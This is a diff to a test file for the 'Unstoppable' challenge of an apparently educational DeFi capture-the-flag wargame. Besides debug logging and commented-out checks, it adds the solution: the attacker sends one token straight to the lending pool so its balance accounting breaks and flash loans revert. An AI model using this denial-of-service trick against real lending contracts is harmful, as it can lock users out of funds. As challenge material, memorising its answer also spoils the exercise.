@@ -20,7 +20,8 @@ describe('[Challenge] Unstoppable', function () {
         this.pool = await UnstoppableLenderFactory.deploy(this.token.address);
 
         await this.token.approve(this.pool.address, TOKENS_IN_POOL);
-        await this.pool.depositTokens(TOKENS_IN_POOL);
+        mmssggaddr = await this.pool.depositTokens(TOKENS_IN_POOL);
+        console.log(mmssggaddr);
 
         await this.token.transfer(attacker.address, INITIAL_ATTACKER_TOKEN_BALANCE);
 
@@ -40,10 +41,22 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        console.log("runrunrun");
+        // allowance0 = await this.token.allowance(this.pool.address, this.receiverContract.address);
+        // balance0 = await this.token.balanceOf(this.pool.address);
+
+        // console.log("balance", balance0.toString());
+        // console.log("allowance", allowance0.toString());
+        // console.log(await this.token.address);
+        // console.log(await this.pool.address);
+        
+        await this.token.connect(attacker).transfer(this.pool.address, 1);
+
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS */
+        console.log("afterafter");
 
         // It is no longer possible to execute flash loans
         await expect(
@@ -51,3 +64,4 @@ describe('[Challenge] Unstoppable', function () {
         ).to.be.reverted;
     });
 });
+    
